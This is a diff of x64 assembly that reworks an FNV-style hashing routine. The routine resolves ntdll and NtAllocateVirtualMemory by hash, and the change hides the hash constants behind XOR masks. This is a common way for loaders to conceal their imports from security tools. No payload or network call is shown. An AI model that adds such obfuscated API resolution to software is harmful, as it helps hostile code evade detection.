@@ -69,7 +69,7 @@ endm
 
 ctodec macro char
     local tmp
-    tmp = 0x00
+    tmp = 0x41
     while tmp lt char
 
         tmp = tmp + 1
@@ -114,9 +114,10 @@ start proc
     local   d_ents[10]:dapi_entry
     local   d_table:dapi
     local   key:qword
-    gethash_m ntdll.dll, testcnst
+    gethash_m NtAllocateVirtualMemory, testcnst
     
     mov     rcx, hash_ntdll
+
     call    getmod
     mov     rcx, rax
     mov     rdx, hash_ntavm
@@ -237,17 +238,21 @@ gethash proc fastcall src:qword, len:dword
     xor     rbx, rbx
     mov     rsi, rcx                        ; rsi is the source buffer
     xor     ecx, ecx                        ; ecx is the counter
-    mov     eax, 0x811c9dc                  ; rax is the encoded basis (basis)
+    mov     rax, hash_offset                ; rax is the encoded hash (basis)
+    mov     r8, hash_mask                   ; decode the basis
+    xor     rax, r8                         ; ...
 _loop:
     cmp     ecx, edx
     je      _done
     mov     bl, [rsi+rcx]
-    xor     eax, ebx                        ; hash = hash ^ src[i]
-    mov     edi, 0x01000193
-    imul    eax, edi                        ; hash = hash * prime
+    xor     rax, rbx                        ; hash = hash ^ src[i]
+    mov     rdi, hash_prime                 ; rdi is the prime (encoded)
+    xor     rdi, r8                         ; decode the prime
+    imul    rax, rdi                        ; hash = hash * prime
     inc     ecx
     jmp     _loop
 _done:
+    xor     rax, r8                         ; mask the hash
     pop     rdi
     pop     rsi
     pop     rbx
